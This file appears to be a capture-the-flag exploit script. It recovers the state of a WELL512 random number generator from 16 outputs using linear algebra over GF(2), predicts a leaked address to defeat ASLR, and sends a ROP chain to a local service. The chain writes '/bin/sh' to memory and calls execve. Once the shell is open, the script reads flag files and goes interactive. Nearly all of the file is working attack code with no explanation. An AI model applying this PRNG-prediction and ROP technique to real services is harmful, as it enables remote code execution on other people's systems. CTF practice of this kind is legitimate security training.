#!/usr/bin/sage -python

import sys
import struct
import time
from sage.all import *

## Debugging info. Not used.
GEN = [0x5732ef12, 0x7d24dd72, 0xf8512c9c, 0x4c568531, 0x3f0d96d8, 0x1dfa4855, 0x4e79ac9, 0x7fb9ed22, 0x6eadf4f2, 0x3589a410, 0x9980fa77, 0x7d5ec80c, 0x14ed22f5, 0x4bf202a6, 0x816e6c16, 0xa173ca71]
GEN = map(lambda x: x+1, GEN)

GEN_init = [  # don't need
  0xb2, 0x66, 0x6b, 0xeb, 0x8b, 0x3e, 0x07, 0x2a, 0xc5, 0xd5, 0xcb, 0xb5,
  0x4d, 0x49, 0x65, 0xc1, 0x74, 0x78, 0x19, 0x20, 0xf4, 0x9e, 0x02, 0xa0,
  0x12, 0xaa, 0x4a, 0xd1, 0x8b, 0x93, 0xd4, 0xe4, 0x00, 0xa0, 0x1a, 0x55,
  0xba, 0xad, 0x83, 0xbc, 0x74, 0x73, 0xb4, 0x5b, 0x46, 0xf5, 0x28, 0xba,
  0x11, 0xa2, 0xc4, 0xd6, 0xd4, 0xff, 0x42, 0x23, 0x0b, 0x6e, 0x59, 0xab,
  0xcc, 0xc4, 0x0d, 0x9e
]
GEN_init = struct.unpack('I'*16, ''.join(map(chr, GEN_init)))
## / Debugging info.


class Well512(object):
  def __init__(self, state):
    assert len(state) == 16
    self.idx = 0
    self.state = [x for x in state]

  def gen(self):
    idx = self.idx
    state = self.state

    v5 = state[(idx + 15) & 0xF];
    v5 &= 0xffffffff;
    v6 = state[(idx + 13) & 0xF] ^ state[idx] ^ (state[idx] << 16) ^ (state[(idx + 13) & 0xF] << 15);
    v6 &= 0xffffffff;
    v7 = state[(idx + 9) & 0xF] ^ (state[(idx + 9) & 0xF] >> 11);
    v7 &= 0xffffffff;
    v8 = ((v7 ^ v6) << 5) & 0xDA442D24 ^ v7 ^ v5 ^ (v5 << 2) ^ (v6 << 18) ^ (v7 << 28);
    v8 &= 0xffffffff;

    state[(idx + 10) & 0xF] = v7 ^ v6;
    state[(idx + 15) & 0xF] = v8;

    self.idx = (idx + 15) & 0xF;
    return v8


def v512_to_v16(v):
  assert len(v) == 512
  assert all(x in [0,1] for x in v)

  u = [0] * 16
  for i in xrange(512):
    u[i / 32] |= v[i] << (i % 32)
  return u

def v16_to_v512(v):
  assert len(v) == 16
  assert all(0 <= x < 2**32 for x in v)

  u = [0] * 512
  for i in xrange(512):
    u[i] = (v[i / 32] >> (i % 32)) & 1
  return u


Mstep = MatrixSpace(GF(2), 512, 512)
V512 = MatrixSpace(GF(2), 512, 1)


def get_linearmap_column(pos, w_idx):
  """ Get pos'th column of the transform matrix for Well512 with index at w_idx.
  """
  assert 0 <= pos < 512
  assert 0 <= w_idx < 16

  w = Well512(v512_to_v16([0 if i != pos else 1 for i in xrange(512)]))
  w.idx = w_idx
  w.gen()
  return v16_to_v512(w.state)


if 0:
  for w_idx in xrange(16):
    m = Mstep()
    for i in xrange(512):
      m[:,i] = V512(get_linearmap_column(i, w_idx))

    m.save('gen_m_%d.mat' % w_idx)  # Individual step matrices.

if 0:
  mats = [load('gen_m_%d.mat.sobj' % i) for i in xrange(16)]

  M = Mstep()
  product = identity_matrix(GF(2), 512)
  for step in xrange(0, 16):
    product = mats[-step] * product

    for i in xrange(32):
      num = ((-step-1) % 16) * 32 + i
      M.set_row(32*step + i, product.row(num))

  M.save('gen_m_solver')  # Solver matrix.

M = load('gen_m_solver.sobj')


from hacklib.sockets import Socket

sock = Socket('localhost', 4141)

drain = lambda: sock.recvuntil('Quit\n')
drain()

def get_one():
  sock.sendline('3')
  sock.recvuntil('Random: ')
  number = int(sock.recvuntil('\n'), 16)
  drain()
  return number


# Get 16 consecutive numbers to determine the state.
vals = []
for _ in xrange(0, 16):
  vals.append(get_one() + 1)

state = M.solve_right(V512(v16_to_v512(vals)))
state = v512_to_v16(map(int, state.column(0)))

# Seed the PRNG with the stolen state.
w = Well512(state)
for i in xrange(16):
  w.gen()

# Check we're in sync with the server.
assert w.gen() == get_one() + 1


TEXT_BASE = w.gen() & 0xfffff000
BSS_WRABLE = 0x804CAE8  # something in bss (writeable)

POP_DCB_RET = 0x0804961a # 0x0804961a: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
POP_ABS_RET = 0x0804908f # 0x0804908f: pop eax ; pop ebx ; pop esi ; ret  ;  (1 found)
INT80_RET   = 0x0804875f # 0x0804875f: int 0x80 ;  (1 found)

def shift(addr):
  return addr - 0x8048000 + TEXT_BASE

def syscall(eax=0x41414141, ebx=0x41414141, ecx=0x41414141, edx=0x41414141, esi=0x41414141):
  s = ''
  s += struct.pack('IIII', shift(POP_DCB_RET), edx, ecx, ebx)
  s += struct.pack('IIII', shift(POP_ABS_RET), eax, ebx, esi)
  s += struct.pack('I', shift(INT80_RET))
  return s

print 'TEXT_BASE', hex(TEXT_BASE)

# Our /bin/sh\0 string is going to also contain \0\0\0\0 for argv and envp pointers.
BINSH = shift(BSS_WRABLE)
ARGV = shift(BSS_WRABLE + 12)
ENVP = shift(BSS_WRABLE + 12)

rop = 'B'*22
rop += syscall(3, 0, BINSH, 20)
rop += syscall(11, BINSH, ARGV, ENVP)
rop = rop.ljust(100, 'A')


sock.sendline('4')
sock.send(rop)
time.sleep(0.1)
sock.send('/bin/sh'.ljust(20, '\0'))

sock.sendline('cat /home/*/*flag*')
sock.shell()
